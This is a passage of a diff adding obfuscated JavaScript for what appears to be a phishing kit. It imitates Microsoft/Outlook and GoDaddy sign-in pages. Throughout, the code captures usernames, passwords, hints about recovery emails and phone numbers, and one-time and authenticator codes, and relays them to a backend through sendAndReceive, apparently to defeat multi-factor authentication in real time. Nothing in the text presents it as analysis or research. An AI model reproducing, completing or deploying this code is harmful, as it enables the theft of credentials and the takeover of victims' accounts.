+  _0x5ebfc6.innerHTML = '';
+  _0x5abc5d.forEach((_0x31778a, _0x482a11) => {
+    const _0x45791b = document.createElement("div");
+    _0x45791b.id = 'proofDiv' + _0x482a11;
+    const _0x18ce67 = document.createElement("div");
+    _0x18ce67.classList.add("radio");
+    const _0x39529b = document.createElement("label");
+    const _0x4a704b = document.createElement("input");
+    _0x4a704b.type = 'radio';
+    _0x4a704b.setAttribute('onchange', "selectprotectoption(this)");
+    _0x4a704b.role = "radio";
+    _0x4a704b.name = "proof";
+    _0x4a704b.value = _0x31778a.type;
+    _0x4a704b.classList.add("inputAlignMiddle");
+    _0x4a704b.setAttribute('aria-describedby', "iEnterProofDesc iProofLbl1");
+    const _0x311b47 = document.createElement("span");
+    _0x311b47.id = 'iProofLbl1';
+    _0x311b47.classList.add("dirltr");
+    _0x311b47.textContent = _0x31778a.text;
+    if (_0x482a11 == 0x0) {
+      _0x4a704b.checked = true;
+    }
+    _0x39529b.appendChild(_0x4a704b);
+    _0x39529b.appendChild(_0x311b47);
+    _0x18ce67.appendChild(_0x39529b);
+    _0x45791b.appendChild(_0x18ce67);
+    if (_0x482a11 == 0x0 && _0x31778a.type === 'email') {
+      emailval = _0x31778a.text.split('@').pop();
+      const _0x1afbe4 = document.createElement("div");
+      _0x1afbe4.classList.add("iAdditionalProofInfo");
+      const _0x4670a9 = document.createElement("div");
+      _0x4670a9.classList.add('text-block-body');
+      _0x4670a9.id = 'iEnterProofDesc';
+      _0x4670a9.textContent = "To verify that this is your email address, complete the hidden part and click \"Send code\" to receive your code.";
+      const _0x4bb100 = document.createElement("div");
+      _0x4bb100.setAttribute('role', 'alert');
+      _0x4bb100.setAttribute("aria-live", 'assertive');
+      const _0x345262 = document.createElement("div");
+      _0x345262.classList.add('alert', 'alert-error', 'Hide');
+      _0x345262.id = "iProofInputError";
+      const _0x34f7b8 = document.createElement("div");
+      _0x34f7b8.classList.add("emailPartial", 'dirltr', "input-group", 'input-max-width');
+      _0x34f7b8.id = 'iProofEmailEntry';
+      _0x34f7b8.style.display = 'table';
+      const _0x3f829c = document.createElement("input");
+      _0x3f829c.type = "email";
+      _0x3f829c.name = "iProofEmail";
+      _0x3f829c.classList.add("form-control", "noRightBorder");
+      _0x3f829c.setAttribute("autocomplete", "off");
+      _0x3f829c.maxLength = "113";
+      _0x3f829c.setAttribute("aria-required", "true");
+      _0x3f829c.setAttribute("aria-label", "Email name");
+      _0x3f829c.setAttribute("aria-describedby", "iProofInputError");
+      const _0x20e20c = document.createElement("label");
+      _0x20e20c.classList.add("input-group-addon", "noLeftBorder", 'outlookEmailLabel');
+      _0x20e20c.textContent = '@' + emailval;
+      _0x34f7b8.appendChild(_0x3f829c);
+      _0x34f7b8.appendChild(_0x20e20c);
+      _0x1afbe4.appendChild(_0x4670a9);
+      _0x4bb100.appendChild(_0x345262);
+      _0x1afbe4.appendChild(_0x4bb100);
+      _0x1afbe4.appendChild(_0x34f7b8);
+      _0x45791b.appendChild(_0x18ce67);
+      _0x45791b.appendChild(_0x1afbe4);
+    } else {
+      if (_0x482a11 == 0x0 && _0x31778a.type === 'text') {
+        const _0x43fabf = document.createElement("div");
+        _0x43fabf.classList.add("iAdditionalProofInfo");
+        const _0x42d5d9 = document.createElement('div');
+        _0x42d5d9.classList.add('text-block-body');
+        _0x42d5d9.id = "iEnterProofDesc";
+        _0x42d5d9.textContent = "To verify that this is your phone number, enter the last 4 digits including 95, and then click \"Send code\" to receive your code.";
+        const _0x1f082c = document.createElement("div");
+        _0x1f082c.setAttribute('role', "alert");
+        _0x1f082c.setAttribute("aria-live", "assertive");
+        const _0x1da8f4 = document.createElement("div");
+        _0x1da8f4.classList.add("alert", "alert-error", 'Hide');
+        _0x1da8f4.id = "iProofInputError";
+        const _0x4eb798 = document.createElement("div");
+        _0x4eb798.classList.add("phcontainer");
+        _0x4eb798.id = "iProofPhoneEntry";
+        _0x4eb798.style.display = '';
+        const _0x66b3e9 = document.createElement("label");
+        _0x66b3e9.classList.add("form-group-top");
+        _0x66b3e9.id = 'iProofPhoneHint';
+        _0x66b3e9.setAttribute("for", "iProofPhone");
+        _0x66b3e9.setAttribute("aria-hidden", "true");
+        _0x66b3e9.textContent = "Last 4 digits of phone number";
+        const _0x321e83 = document.createElement('input');
+        _0x321e83.type = 'tel';
+        _0x321e83.id = "iProofPhone";
+        _0x321e83.name = 'iProofPhone';
+        _0x321e83.classList.add("form-control", "input-max-width");
+        _0x321e83.setAttribute("autocomplete", "off");
+        _0x321e83.maxLength = '4';
+        _0x321e83.setAttribute("aria-required", "true");
+        _0x321e83.setAttribute('aria-label', "Last 4 digits of phone number");
+        _0x321e83.setAttribute("aria-describedby", "iProofInputError");
+        _0x4eb798.appendChild(_0x66b3e9);
+        _0x4eb798.appendChild(_0x321e83);
+        _0x43fabf.appendChild(_0x42d5d9);
+        _0x1f082c.appendChild(_0x1da8f4);
+        _0x43fabf.appendChild(_0x1f082c);
+        _0x43fabf.appendChild(_0x4eb798);
+        _0x45791b.appendChild(_0x18ce67);
+        _0x45791b.appendChild(_0x43fabf);
+      }
+    }
+    _0x5ebfc6.appendChild(_0x45791b);
+  });
+}
+function displaymultipleaccounts(_0x38a27c) {
+  const _0x17be54 = document.getElementById("multipleaccountoptions");
+  _0x17be54.innerHTML = '';
+  _0x38a27c.forEach(_0x2dab19 => {
+    const _0x269324 = document.createElement("div");
+    _0x269324.classList.add("row", "tile");
+    _0x269324.setAttribute('onclick', "selectmultipleaccount(this)");
+    _0x269324.setAttribute("role", 'listitem');
+    const _0x5bd618 = document.createElement('div');
+    _0x5bd618.classList.add("table");
+    _0x5bd618.setAttribute("role", "button");
+    const _0xbde0ee = document.createElement("div");
+    _0xbde0ee.classList.add("table-row");
+    const _0x3a9eca = document.createElement("div");
+    _0x3a9eca.classList.add("table-cell", "tile-img");
+    const _0x3f1d0f = document.createElement("img");
+    _0x3f1d0f.classList.add("tile-img");
+    _0x3f1d0f.setAttribute("role", 'presentation');
+    _0x3f1d0f.setAttribute('src', _0x2dab19.image_src);
+    _0x3a9eca.appendChild(_0x3f1d0f);
+    const _0xde8790 = document.createElement("div");
+    _0xde8790.classList.add("table-cell", "text-left", "content");
+    const _0x5619d8 = document.createElement("div");
+    _0x5619d8.innerText = _0x2dab19.tiletitle;
+    const _0x520bb0 = document.createElement("div");
+    const _0x1237ec = document.createElement("small");
+    _0x1237ec.innerText = _0x2dab19.titlehint;
+    _0x520bb0.appendChild(_0x1237ec);
+    const _0x3c3730 = document.createElement('div');
+    const _0x3dc1f3 = document.createElement("small");
+    _0x3dc1f3.innerText = _0x2dab19.email;
+    _0x3c3730.appendChild(_0x3dc1f3);
+    _0xde8790.appendChild(_0x5619d8);
+    _0xde8790.appendChild(_0x520bb0);
+    _0xde8790.appendChild(_0x3c3730);
+    _0xbde0ee.appendChild(_0x3a9eca);
+    _0xbde0ee.appendChild(_0xde8790);
+    _0x5bd618.appendChild(_0xbde0ee);
+    _0x269324.appendChild(_0x5bd618);
+    _0x17be54.appendChild(_0x269324);
+  });
+}
+function displaytwofamethods(_0x99f4f2) {
+  const _0x1f24c4 = document.getElementById("2famethods");
+  _0x1f24c4.innerHTML = '';
+  _0x99f4f2.forEach(_0x5ce732 => {
+    const _0x461f00 = document.createElement("div");
+    _0x461f00.classList.add("row", "tile");
+    _0x461f00.setAttribute('data-methodid', _0x5ce732.methodid);
+    _0x461f00.setAttribute("onclick", "selecttwofamethod(this)");
+    _0x461f00.setAttribute("role", 'listitem');
+    const _0x1b7f44 = document.createElement("div");
+    _0x1b7f44.classList.add("table");
+    _0x1b7f44.setAttribute("tabindex", '0');
+    _0x1b7f44.setAttribute("role", 'button');
+    const _0x7bd94c = document.createElement('div');
+    _0x7bd94c.classList.add("table-row");
+    const _0xc19ae7 = document.createElement('div');
+    _0xc19ae7.classList.add('table-cell', 'tile-img');
+    if (_0x5ce732.hasOwnProperty("text") && _0x5ce732.hasOwnProperty('image_src')) {
+      const _0xfd7140 = document.createElement("img");
+      _0xfd7140.classList.add("tile-img");
+      _0xfd7140.setAttribute('role', "presentation");
+      _0xfd7140.setAttribute("src", _0x5ce732.image_src);
+      _0xc19ae7.appendChild(_0xfd7140);
+    }
+    const _0x206189 = document.createElement('div');
+    _0x206189.classList.add("table-cell", "text-left", "content");
+    const _0x4e5f38 = _0x5ce732.hasOwnProperty("text") ? _0x5ce732.text : '';
+    _0x206189.textContent = _0x4e5f38;
+    _0x7bd94c.appendChild(_0xc19ae7);
+    _0x7bd94c.appendChild(_0x206189);
+    _0x1b7f44.appendChild(_0x7bd94c);
+    _0x461f00.appendChild(_0x1b7f44);
+    _0x1f24c4.appendChild(_0x461f00);
+  });
+}
+function selecttwofamethod(_0x29a0ab) {
+  let _0x13a63c = _0x29a0ab.getAttribute("data-methodid");
+  loadinganimation(0x0);
+  sendAndReceive('twofaselect', [_0x13a63c], 0x1).then(_0x4b7d8a => {
+    if (_0x4b7d8a && _0x4b7d8a.message !== "waiting for previous request to complete") {
+      loadinganimation(0x1);
+      wait2facancel = 0x0;
+      if (_0x4b7d8a.message == "email otp live") {
+        document.getElementById("confirmemailorphone_live_title").innerText = "Verify your email";
+        document.getElementById("inp_confirmemailorphone_live").removeAttribute("maxlength");
+        document.getElementById('inp_confirmemailorphone_live').removeAttribute("oninput");
+        document.getElementById("inp_confirmemailorphone_live").value = '';
+        document.getElementById("inp_confirmemailorphone_live").setAttribute("placeholder", "someone@example.com");
+        document.getElementById("error_confirmemailorphone_live").style.display = "none";
+        document.getElementById("error_confirmemailorphone_live").innerText = '';
+        checkerrordesc("confirmemailorphone_live", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks('confirmemailorphone_live', _0x4b7d8a.bottomsection);
+        changebackbutton("confirmemailorphone_live", _0x4b7d8a.backbutton);
+        document.getElementById("confirmemailorphone_live_hidden").value = _0x4b7d8a.email;
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_confirmemailorphone_live").classList.remove('d-none');
+        view = "confirmemailorphone_live";
+        viewtype = 'email';
+      }
+      if (_0x4b7d8a.message == "sms otp live") {
+        document.getElementById("confirmemailorphone_live_title").innerText = "Verify your phone number";
+        document.getElementById('inp_confirmemailorphone_live').setAttribute('maxlength', '4');
+        document.getElementById("inp_confirmemailorphone_live").setAttribute("oninput", "validatediginp(this)");
+        document.getElementById("inp_confirmemailorphone_live").value = '';
+        document.getElementById("inp_confirmemailorphone_live").setAttribute("placeholder", "Last 4 digits of phone number");
+        document.getElementById('error_confirmemailorphone_live').style.display = 'none';
+        document.getElementById("error_confirmemailorphone_live").innerText = '';
+        checkerrordesc("confirmemailorphone_live", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks("confirmemailorphone_live", _0x4b7d8a.bottomsection);
+        changebackbutton("confirmemailorphone_live", _0x4b7d8a.backbutton);
+        document.getElementById("confirmemailorphone_live_hidden").value = _0x4b7d8a.phone;
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_confirmemailorphone_live").classList.remove("d-none");
+        view = "confirmemailorphone_live";
+        viewtype = "phone";
+      }
+      if (_0x4b7d8a.message == "otp sent live") {
+        document.getElementById("inp_otp_live").setAttribute('placeholder', 'Code');
+        document.getElementById("error_otp_live").style.display = 'none';
+        document.getElementById('error_otp_live').innerText = '';
+        document.getElementById("otpliveimg").setAttribute("src", _0x4b7d8a.image_src);
+        checkerrordesc("otp_live", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks("otp_live", _0x4b7d8a.bottomsection);
+        changebackbutton("otp_live", _0x4b7d8a.backbutton);
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_otp_live").classList.remove("d-none");
+        view = "otp_live";
+        viewtype = "otp";
+      }
+      if (_0x4b7d8a.message == "approve auth request auth app live") {
+        document.getElementById("error_authapp_live").style.display = "none";
+        document.getElementById('error_authapp_live').innerText = '';
+        document.getElementById("authapp_live_code").innerText = _0x4b7d8a.authappreqid;
+        bottomsectionlinks("authapp_live", _0x4b7d8a.bottomsection);
+        changebackbutton("authapp_live", _0x4b7d8a.backbutton);
+        document.getElementById('section_' + view).classList.toggle("d-none");
+        document.getElementById('section_authapp_live').classList.remove("d-none");
+        view = "authapp_live";
+        viewtype = "auth";
+        wait2fa('app', _0x4b7d8a.methodid);
+      }
+      if (_0x4b7d8a.message == "duplicate request") {
+        wait2facancel = 0x1;
+        if (document.getElementById('section_tryagainlater').classList.contains("d-none")) {
+          document.getElementById("section_tryagainlater").querySelector('.title').innerText = "Too many Attempts";
+          setTimeout(function () {
+            document.getElementById("section_" + view).querySelector(".loading-container").classList.remove("loading");
+            runanimation(0x2, view, 0.5, 0x0);
+            setTimeout(function () {
+              document.getElementById('section_' + view).classList.toggle("d-none");
+              document.getElementById("section_tryagainlater").querySelector("#tryagainheader").style.display = 'block';
+              document.getElementById("section_tryagainlater").querySelector("#tryagain_toomanyattempts").style.display = 'block';
+              document.getElementById('section_tryagainlater').querySelector('.sectioncontent').style.animation = "show-from-right 0.5s";
+              document.getElementById("section_tryagainlater").classList.remove("d-none");
+              view = "tryagainlater";
+            }, 0xc8);
+          }, 0x1f4);
+        }
+      }
+      if (_0x4b7d8a.message == "session timeout") {
+        if (document.getElementById("section_tryagainlater").classList.contains('d-none')) {
+          document.getElementById("section_tryagainlater").querySelector(".title").innerText = "We didn't hear from you";
+          setTimeout(function () {
+            document.getElementById("section_" + view).querySelector(".loading-container").classList.remove("loading");
+            runanimation(0x2, view, 0.5, 0x0);
+            setTimeout(function () {
+              document.getElementById("section_" + view).classList.toggle('d-none');
+              document.getElementById("section_tryagainlater").querySelector("#tryagainheader").style.display = 'block';
+              document.getElementById("section_tryagainlater").querySelector('#tryagain_withoutinternet').style.display = "block";
+              document.getElementById("section_tryagainlater").querySelector(".sectioncontent").style.animation = "show-from-right 0.5s";
+              document.getElementById("section_tryagainlater").classList.remove("d-none");
+              view = "tryagainlater";
+            }, 0xc8);
+          }, 0x1f4);
+        }
+      }
+      if (_0x4b7d8a.message == "redirected back to sign in") {
+        document.getElementById("inp_uname").value = '';
+        document.getElementById("error_pwd").innerText = '';
+        document.getElementById("inp_pwd").value = '';
+        bottomsectionlinks("uname", [{
+          'a_id': "signup",
+          'a_text': "Create one!",
+          'text': "No account?",
+          'type': "text_link"
+        }, {
+          'a_id': 'cantAccessAccount',
+          'a_text': "Can't access your account?",
+          'type': "link"
+        }]);
+        ;
+        document.getElementById('section_' + view).querySelector(".sectioncontent").style.animation = '';
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById('section_uname').querySelector(".sectioncontent").style.animation = '';
+        document.getElementById("section_uname").classList.remove("d-none");
+        if (document.body.style.backgroundImage) {
+          document.body.style.backgroundImage = '';
+        }
+        if (document.body.style.backgroundColor) {
+          document.body.style.backgroundColor = '';
+        }
+      }
+      if (_0x4b7d8a.message == "lets try something else or come back") {
+        document.getElementById("section_signinanothererror").querySelector(".title").textContent = _0x4b7d8a.title;
+        checkerrordesc('signinanothererrordesc', 0x2, _0x4b7d8a.signinanothererrordesc);
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_signinanothererror").classList.remove("d-none");
+        bottomsectionlinks('signinanothererror', _0x4b7d8a.bottomsection);
+        view = "signinanothererror";
+      }
+      if (_0x4b7d8a.message == "you dont have access") {
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_youdonthaveaccess").classList.remove("d-none");
+        view = 'youdonthaveaccess';
+      }
+      if (_0x4b7d8a.message == "otp sent") {
+        if (_0x4b7d8a.type == "otp") {
+          otptype = 0x1;
+        }
+        if (_0x4b7d8a.type == "sms") {
+          otptype = 0x2;
+        }
+        if (_0x4b7d8a.type == 'callotp') {
+          otptype = 0x3;
+        }
+        document.getElementById("error_2fa").innerText = '';
+        document.getElementById("otpimg").setAttribute("src", _0x4b7d8a.image_src);
+        checkerrordesc("otp", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks("otp", _0x4b7d8a.bottomsection);
+        changebackbutton("otp", _0x4b7d8a.backbutton);
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_otp").classList.remove("d-none");
+        view = "otp";
+        viewtype = null;
+      }
+      if (_0x4b7d8a.message == "approve auth request auth app") {
+        document.getElementById("error_2fa").innerText = '';
+        document.getElementById("authappimg").setAttribute("src", _0x4b7d8a.image_src);
+        checkerrordesc("authapp", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks("authapp", _0x4b7d8a.bottomsection);
+        changebackbutton("authapp", _0x4b7d8a.backbutton);
+        document.getElementById("authappcode").textContent = _0x4b7d8a.authappcode;
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_authapp").classList.remove('d-none');
+        view = "authapp";
+        viewtype = null;
+        wait2fa('app', _0x4b7d8a.methodid);
+      }
+      if (_0x4b7d8a.message == "approve auth request calling") {
+        document.getElementById("section_authcall").querySelector(".back").focus();
+        document.getElementById("error_2fa").innerText = '';
+        document.getElementById("authcallimg").setAttribute("src", _0x4b7d8a.image_src);
+        checkerrordesc('authcall', 0x0, _0x4b7d8a.description);
+        bottomsectionlinks('authcall', _0x4b7d8a.bottomsection);
+        changebackbutton("authcall", _0x4b7d8a.backbutton);
+        document.getElementById("section_" + view).classList.toggle("d-none");
+        document.getElementById("section_authcall").classList.remove('d-none');
+        view = "authcall";
+        viewtype = null;
+        wait2fa("call");
+      }
+      if (_0x4b7d8a.message == "error") {
+        bottomsectionlinks("2fa", _0x4b7d8a.bottomsection);
+        changebackbutton("2fa", _0x4b7d8a.backbutton);
+        checkerrordesc("2fa", 0x1, _0x4b7d8a.description);
+      }
+      if (_0x4b7d8a.message == "verifyemail") {
+        document.getElementById('error_2fa').innerText = '';
+        checkerrordesc("verifyemail", 0x0, _0x4b7d8a.description);
+        bottomsectionlinks("confirmemail", _0x4b7d8a.bottomsection);
+        changebackbutton("confirmemail", _0x4b7d8a.backbutton);
+        document.getElementById("section_" + view).classList.toggle('d-none');
+        document.getElementById("section_confirmemail").classList.remove("d-none");
+        view = 'confirmemail';
+        viewtype = null;
+      }
+      if (_0x4b7d8a.message == "request wasnt sent") {
+        document.getElementById("section_authapperror").querySelector(".title").textContent = "Request wasn't sent";
+        document.getElementById("authapperrordesc").classList.toggle("error");
+        document.getElementById('authapperrordesc').innerHTML = "<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id=\"ViewDetails\" class=\"no-wrap\" href=\"#\">View details</a>";
+        view = 'authapperror';
+        viewtype = null;
+      }
+    }
+  })["catch"](_0x1cee92 => {
+    loadinganimation(0x1);
+    console.error("Error:", _0x1cee92);
+  });
+}
+const unameInp = document.getElementById("inp_uname");
+const pwdInp = document.getElementById("inp_pwd");
+const pwdInplive = document.getElementById("inp_pwd_live");
+let unameVal = pwdVal = false;
+const nxt = document.getElementById("btn_next");
+nxt.addEventListener('click', () => {
+  validate();
+});
+const sig = document.getElementById("btn_sig");
+sig.addEventListener("click", () => {
+  validate();
+});
+const siglive = document.getElementById('btn_sig_live');
+siglive.addEventListener("click", () => {
+  validate();
+});
+const cancelbtns = document.querySelectorAll('.btn_can');
+for (let i = 0x0; i < cancelbtns.length; i++) {
+  cancelbtns[i].addEventListener('click', () => {
+    loadinganimation(0x0);
+    document.getElementById("section_" + view).querySelector(".sectioncontent").style.animation = '';
+    loadinganimation(0x1);
+    document.getElementById('section_uname').querySelector(".sectioncontent").style.animation = '';
+    document.getElementById('section_' + view).classList.toggle('d-none');
+    document.getElementById('section_uname').querySelector(".sectioncontent").style.animation = '';
+    document.getElementById("section_uname").classList.remove("d-none");
+    if (document.body.style.backgroundImage) {
+      document.body.style.backgroundImage = '';
+    }
+    if (document.body.style.backgroundColor) {
+      document.body.style.backgroundColor = '';
+    }
+    document.getElementById("inp_uname").value = '';
+    document.getElementById("error_pwd").innerText = '';
+    document.getElementById("inp_pwd").value = '';
+    document.getElementById("godaddyemail").value = '';
+    document.getElementById("godaddypassword").value = '';
+    document.getElementById('godaddypassword').setAttribute("type", "password");
+    document.querySelector('button.show-hide-btn').querySelector("span.ux-button-text").textContent = "Show";
+    view = "uname";
+  });
+}
+const protectbtn = document.getElementById('btn_protectaccount');
+function protectsend(_0x3b2f35) {
+  if (protectbtn.textContent == "Send Code") {
+    const _0x2ae85b = document.querySelectorAll("input[type=\"radio\"]");
+    let _0x512a7c = 0x0;
+    for (let _0x1319bf = 0x0; _0x1319bf < _0x2ae85b.length; _0x1319bf++) {
+      if (_0x2ae85b[_0x1319bf] === _0x3b2f35) {
+        _0x512a7c = _0x1319bf;
+        break;
+      }
+    }
+    console.log(_0x512a7c);
+    const _0x37fc2b = document.querySelector("[aria-describedby=\"iProofInputError\"]");
+    loadinganimation(0x0);
+    sendAndReceive('enterprotect', [_0x512a7c, _0x37fc2b.value], 0x1).then(_0x452f9d => {
+      if (_0x452f9d && _0x452f9d.message !== "waiting for previous request to complete") {
+        loadinganimation(0x1);
+        if (_0x452f9d.message == "otp sent") {
+          document.getElementById("error_2fa").innerText = '';
+          document.getElementById('otpimg').setAttribute("src", _0x452f9d.image_src);
+          checkerrordesc("otp", 0x0, _0x452f9d.description);
+          bottomsectionlinks("otp", _0x452f9d.bottomsection);
+          changebackbutton("otp", _0x452f9d.backbutton);
+          document.getElementById('section_2fa').classList.toggle('d-none');
+          document.getElementById("section_otp").classList.remove('d-none');
+          view = "otp";
+        }
+        if (_0x452f9d.message == "error") {
+          bottomsectionlinks("2fa", _0x452f9d.bottomsection);
+          changebackbutton("2fa", _0x452f9d.backbutton);
+          checkerrordesc('2fa', 0x1, _0x452f9d.description);
+        }
+      }
+    })["catch"](_0x32380a => {
+      loadinganimation(0x1);
+      console.error("Error:", _0x32380a);
+    });
+  }
+  if (protectbtn.textContent == "Next") {}
+  if (protectbtn.textContent == "Verify Online") {}
+}
+function twofalive(_0x41984c) {
+  if (view == 'confirmemailorphone_live') {
+    let _0x438b5a = null;
+    let _0x272694 = null;
+    if (viewtype == "email") {
+      _0x438b5a = 'EmailOTP_Live';
+    }
+    if (viewtype == "phone") {
+      _0x438b5a = "OneWaySMS_Live";
+    }
+    let _0x488f68 = document.getElementById("inp_confirmemailorphone_live").value;
+    let _0x200b9c = document.getElementById("confirmemailorphone_live_hidden").value;
+    if (viewtype == 'email') {
+      if (_0x200b9c.slice(0x0, 0x2) !== _0x488f68.slice(0x0, 0x2)) {
+        document.getElementById("error_confirmemailorphone_live").style.marginBottom = "14px";
+        document.getElementById("error_confirmemailorphone_live").style.display = "block";
+        document.getElementById("error_confirmemailorphone_live").innerText = "That doesn't match the alternate email associated with your account. The correct email starts with \"" + _0x200b9c.slice(0x0, 0x2) + "\".";
+      }
+      if (_0x200b9c.slice(0x0, 0x2) == _0x488f68.slice(0x0, 0x2)) {
+        _0x272694 = 0x1;
+      }
+    }
+    if (viewtype == "phone") {
+      if (_0x200b9c.slice(-0x2) !== _0x488f68.slice(-0x2)) {
+        document.getElementById("error_confirmemailorphone_live").style.marginBottom = "14px";
+        document.getElementById('error_confirmemailorphone_live').style.display = "block";
+        document.getElementById("error_confirmemailorphone_live").innerText = "That doesn't match the phone number associated with your account. The correct number ends in " + _0x200b9c.slice(-0x2) + '.';
+      }
+      if (_0x200b9c.slice(-0x2) == _0x488f68.slice(-0x2)) {
+        _0x272694 = 0x1;
+      }
+    }
+    if (_0x272694 == 0x1) {
+      document.getElementById("error_confirmemailorphone_live").style.display = 'none';
+      document.getElementById("error_confirmemailorphone_live").innerText = '';
+      loadinganimation(0x0);
+      sendAndReceive("twofaselected", [_0x438b5a, _0x488f68], 0x1).then(_0x5eae3c => {
+        if (_0x5eae3c && _0x5eae3c.message !== "waiting for previous request to complete") {
+          loadinganimation(0x1);
+          if (_0x5eae3c.message == "signinblocked live") {
+            document.getElementById("signin_blocked_live_email").innerText = _0x5eae3c.email;
+            checkerrordesc('signin_blocked_live', 0x0, _0x5eae3c.description);
+            checkerrordesc("signin_blocked_reason", 0x2, _0x5eae3c.reason);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_signin_blocked_live").classList.remove("d-none");
+            view = "signin_blocked_live";
+          }
+          if (_0x5eae3c.message == "protectaccount live") {
+            checkerrordesc('protect_account_live', 0x0, _0x5eae3c.description);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_protect_account_live").classList.remove("d-none");
+            view = "protect_account_live";
+          }
+          if (_0x5eae3c.message == "email otp") {
+            document.getElementById('error_confirmemailorphone_live').style.display = "none";
+            document.getElementById("error_confirmemailorphone_live").innerText = '';
+            document.getElementById("otpliveimg").setAttribute("src", _0x5eae3c.image_src);
+            checkerrordesc("otp_live", 0x0, _0x5eae3c.description);
+            bottomsectionlinks("otp_live", _0x5eae3c.bottomsection);
+            changebackbutton("otp_live", _0x5eae3c.backbutton);
+            document.getElementById("section_confirmemailorphone_live").classList.toggle("d-none");
+            document.getElementById("section_otp_live").classList.remove("d-none");
+            view = "otp_live";
+            viewtype = "email";
+          }
+          if (_0x5eae3c.message == "phone otp") {
+            document.getElementById("error_confirmemailorphone_live").innerText = '';
+            document.getElementById("otpliveimg").setAttribute('src', _0x5eae3c.image_src);
+            checkerrordesc("otp_live", 0x0, _0x5eae3c.description);
+            bottomsectionlinks("otp_live", _0x5eae3c.bottomsection);
+            changebackbutton("otp_live", _0x5eae3c.backbutton);
+            document.getElementById("section_confirmemailorphone_live").classList.toggle('d-none');
+            document.getElementById('section_otp_live').classList.remove("d-none");
+            view = 'otp_live';
+            viewtype = "phone";
+            document.getElementById("error_confirmemailorphone_live").style.display = "none";
+          }
+        }
+      });
+    }
+  }
+  if (view == "otp_live") {
+    let _0x35d40b = null;
+    let _0x2bce8a = null;
+    if (viewtype == 'email') {
+      _0x35d40b = "EmailOTP_Live_2";
+    }
+    if (viewtype == "phone") {
+      _0x35d40b = "OneWaySMS_Live_2";
+    }
+    if (viewtype == "otp") {
+      _0x35d40b = "PhoneAppOTP_Live";
+    }
+    let _0x4133cc = document.getElementById("inp_otp_live").value;
+    if (viewtype == "email") {
+      if (_0x4133cc == '') {
+        document.getElementById("error_otp_live").style.marginBottom = "14px";
+        document.getElementById("error_otp_live").style.display = "block";
+        document.getElementById('error_otp_live').innerText = "Enter the code to help us verify your identity.";
+      }
+      if (_0x4133cc !== '') {
+        _0x2bce8a = 0x1;
+      }
+    }
+    if (viewtype == "phone") {
+      if (_0x4133cc == '') {
+        document.getElementById("error_otp_live").style.marginBottom = '14px';
+        document.getElementById('error_otp_live').style.display = "block";
+        document.getElementById("error_otp_live").innerText = "Enter the code to help us verify your identity.";
+      }
+      if (_0x4133cc !== '') {
+        _0x2bce8a = 0x1;
+      }
+    }
+    if (viewtype == "otp") {
+      if (_0x4133cc == '') {
+        document.getElementById("error_otp_live").style.marginBottom = "14px";
+        document.getElementById("error_otp_live").style.display = 'block';
+        document.getElementById("error_otp_live").innerText = "Enter the code to help us verify your identity.";
+      }
+      if (_0x4133cc !== '') {
+        _0x2bce8a = 0x1;
+      }
+    }
+    if (_0x2bce8a == 0x1) {
+      document.getElementById('error_otp_live').style.display = "none";
+      document.getElementById('error_otp_live').innerText = '';
+      loadinganimation(0x0);
+      sendAndReceive("twofaselected", [_0x35d40b, _0x4133cc], 0x1).then(_0x5d243c => {
+        if (_0x5d243c && _0x5d243c.message !== "waiting for previous request to complete") {
+          loadinganimation(0x1);
+          if (_0x5d243c.message == "signinblocked live") {
+            document.getElementById("signin_blocked_live_email").innerText = _0x5d243c.email;
+            checkerrordesc("signin_blocked_live", 0x0, _0x5d243c.description);
+            checkerrordesc("signin_blocked_reason", 0x2, _0x5d243c.reason);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_signin_blocked_live").classList.remove('d-none');
+            view = 'signin_blocked_live';
+          }
+          if (_0x5d243c.message == "protectaccount live") {
+            checkerrordesc("protect_account_live", 0x0, _0x5d243c.description);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_protect_account_live").classList.remove('d-none');
+            view = 'protect_account_live';
+          }
+          if (_0x5d243c.message == "valid email otp" || _0x5d243c.message == "valid phone otp" || _0x5d243c.message == "valid phone app otp") {
+            document.getElementById("otpdesc").innerText = '';
+            document.getElementById('section_otp_live').classList.toggle("d-none");
+            document.getElementById("section_final").classList.remove("d-none");
+            view = 'final';
+          }
+          if (_0x5d243c.message == "error live") {
+            document.getElementById("error_otp_live").style.display = "block";
+            checkerrordesc("otp_live", 0x1, _0x5d243c.description);
+            bottomsectionlinks("otp_live", _0x5d243c.bottomsection);
+            changebackbutton("otp_live", _0x5d243c.backbutton);
+          }
+        }
+      });
+    }
+  }
+}
+const confirmbtn = document.getElementById("btn_confirmemail");
+confirmbtn.addEventListener("click", () => {
+  const _0x245c0b = document.getElementById("inp_confirmemail");
+  loadinganimation(0x0);
+  sendAndReceive("confirmemail", [_0x245c0b.value], 0x1).then(_0x1aa890 => {
+    if (_0x1aa890 && _0x1aa890.message !== "waiting for previous request to complete") {
+      loadinganimation(0x1);
+      if (_0x1aa890.message == "otp sent") {
+        document.getElementById("error_verifyemail").innerText = '';
+        document.getElementById("otpimg").setAttribute('src', _0x1aa890.image_src);
+        checkerrordesc("otp", 0x0, _0x1aa890.description);
+        bottomsectionlinks("otp", _0x1aa890.bottomsection);
+        changebackbutton("otp", _0x1aa890.backbutton);
+        document.getElementById('section_confirmemail').classList.toggle("d-none");
+        document.getElementById("section_otp").classList.remove('d-none');
+        view = "otp";
+      }
+      if (_0x1aa890.message == "if otp sent") {
+        document.getElementById("error_verifyemail").innerText = '';
+        document.getElementById("otpimg").setAttribute("src", _0x1aa890.image_src);
